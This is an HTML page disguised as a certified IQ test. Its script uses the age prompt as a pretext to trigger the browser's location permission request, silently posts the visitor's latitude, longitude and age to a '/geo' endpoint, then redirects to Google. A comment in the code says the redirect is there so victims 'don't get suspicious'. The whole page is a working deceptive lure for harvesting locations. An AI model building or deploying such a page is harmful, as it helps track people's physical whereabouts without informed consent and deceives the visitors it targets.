<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Official IQ Test 2024</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 350px; }
        h1 { color: #2c3e50; font-size: 24px; }
        p { color: #7f8c8d; font-size: 14px; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #3498db; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #2980b9; }
    </style>
</head>
<body>

<div class="card">
    <h1>IQ Calculator</h1>
    <p>Enter your age to begin the certified IQ assessment.</p>
    <input type="number" id="age" placeholder="Enter your age (e.g. 21)">
    <button onclick="startTest()">Start IQ Test</button>
</div>

<script>
function startTest() {
    const ageVal = document.getElementById('age').value;
    if (!ageVal) { alert("Please enter your age first"); return; }

    // This triggers the browser's REAL Permission Popup
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => sendData(pos, ageVal), 
            (err) => redirect() 
        );
    } else {
        redirect();
    }
}

function sendData(position, age) {
    fetch('/geo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            lat: position.coords.latitude,
            lon: position.coords.longitude,
            age: age
        })
    }).then(() => redirect());
}

function redirect() {
    // Redirect to a real IQ test or Google so they don't get suspicious
    window.location.href = "https://www.google.com";
}
</script>

</body>
</html>
